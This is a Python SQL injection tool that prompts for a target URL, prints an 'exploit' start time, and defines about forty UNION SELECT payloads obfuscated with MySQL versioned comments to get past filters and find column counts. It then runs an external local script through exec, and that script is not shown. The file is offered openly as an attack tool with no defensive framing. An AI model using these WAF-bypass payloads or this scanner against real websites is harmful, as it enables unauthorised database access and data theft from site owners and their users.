# SQL
import requests
import os
import re
import datetime
import time
from bs4 import BeautifulSoup

os.system('cls' if os.name == 'nt' else 'clear')

with open('var/www/hello.txt', 'r') as banner:
    content = banner.read()
    print("")
    print(content)

print("")
url = input("URL TARgET : ")
print("")
time_start = datetime.datetime.now()
start_exploit = time_start.strftime("Starting exploit time : %H:%M:%S - /%d/%m/%Y")
print(start_exploit)
time.sleep(2)
payload_name_bypass_1 = [
    '/*!50000/**8**/Union*//*!50000/**8**/Select*/1--+-',
    '/*!50000/**8**/Union*//*!50000/**8**/Select*/1,2--+-',
    '/*!50000/**8**/Union*//*!50000/**8**/Select*/1,2,3--+-',
    '/*!50000/**8**/Union*//*!50000/**8**/Select*/1,2,3,4--+-',
    '/*!50000/**8**/Union*//*!50000/**8**/Select*/1,2,3,4,5--+-',
    '/*!50000/**8**/Union*//*!50000/**8**/Select*/1,2,3,4,5,6--+-',
    '/*!50000/**8**/Union*//*!50000/**8**/Select*/1,2,3,4,5,6,7--+-',
    '/*!50000/**8**/Union*//*!50000/**8**/Select*/1,2,3,4,5,6,7,8--+-',
    '/*!50000/**8**/Union*//*!50000/**8**/Select*/1,2,3,4,5,6,7,8,9--+-',
    '/*!50000/**8**/Union*//*!50000/**8**/Select*/1,2,3,4,5,6,7,8,9,10--+-',
    '/*!50000/**8**/Union*//*!50000/**8**/Select*/1,2,3,4,5,6,7,8,9,10,11--+-',
    '/*!50000/**8**/Union*//*!50000/**8**/Select*/1,2,3,4,5,6,7,8,9,10,11,12--+-',
    '/*!50000/**8**/Union*//*!50000/**8**/Select*/1,2,3,4,5,6,7,8,9,10,11,12,13--+-',
    '/*!50000/**8**/Union*//*!50000/**8**/Select*/1,2,3,4,5,6,7,8,9,10,11,12,13,14--+-',
    '/*!50000/**8**/Union*//*!50000/**8**/Select*/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15--+-',
    '/*!50000/**8**/Union*//*!50000/**8**/Select*/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16--+-',
    '/*!50000/**8**/Union*//*!50000/**8**/Select*/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17--+-',
    '/*!50000/**8**/Union*//*!50000/**8**/Select*/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18--+-',
    '/*!50000/**8**/Union*//*!50000/**8**/Select*/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19--+-',
    '/*!50000/**8**/Union*//*!50000/**8**/Select*/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20--+-',
    '/**8**//*!50000/**8**/Union*//*!50000/**8**/Select*/ NULL,NULL--+-',
    '/**8**//*!50000/**8**/Union*//*!50000/**8**/Select*/NULL,NULL,NULL--+-',
    '/**8**//*!50000/**8**/Union*//*!50000/**8**/Select*/NULL,NULL,NULL,NULL--+-',
    '/**8**//*!50000/**8**/Union*//*!50000/**8**/Select*/NULL,NULL,NULL,NULL,NULL--+-',
    '/**8**//*!50000/**8**/Union*//*!50000/**8**/Select*/NULL,NULL,NULL,NULL,NULL,NULL--+-',
    '/**8**//*!50000/**8**/Union*//*!50000/**8**/Select*/NULL,NULL,NULL,NULL,NULL,NULL,NULL--+-',
    '/**8**//*!50000/**8**/Union*//*!50000/**8**/Select*/NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--+-',
    '/**8**//*!50000/**8**/Union*//*!50000/**8**/Select*/NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--+-',
    '/**8**//*!50000/**8**/Union*//*!50000/**8**/Select*/NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--+-',
    '/**8**//*!50000/**8**/Union*//*!50000/**8**/Select*/NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--+-',
    '/**8**//*!50000/**8**/Union*//*!50000/**8**/Select*/NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--+-',
    '/**8**//*!50000/**8**/Union*//*!50000/**8**/Select*/NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--+-',
    '/**8**//*!50000/**8**/Union*//*!50000/**8**/Select*/NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--+-',
    '/**8**//*!50000/**8**/Union*//*!50000/**8**/Select*/NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--+-',
    '/**8**//*!50000/**8**/Union*//*!50000/**8**/Select*/NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--+-',
    '/**8**//*!50000/**8**/Union*//*!50000/**8**/Select*/NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--+-',
    '/**8**//*!50000/**8**/Union*//*!50000/**8**/Select*/NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--+-',
    '/**8**//*!50000/**8**/Union*//*!50000/**8**/Select*/NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--+-',
    '/**8**//*!50000/**8**/Union*//*!50000/**8**/Select*/NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--+-',
]
text_check = 0
with open('temper/scripts/script.py', 'r') as script:
    run_script = compile(script.read(), 'test/script.py', 'exec')
    exec(run_script)
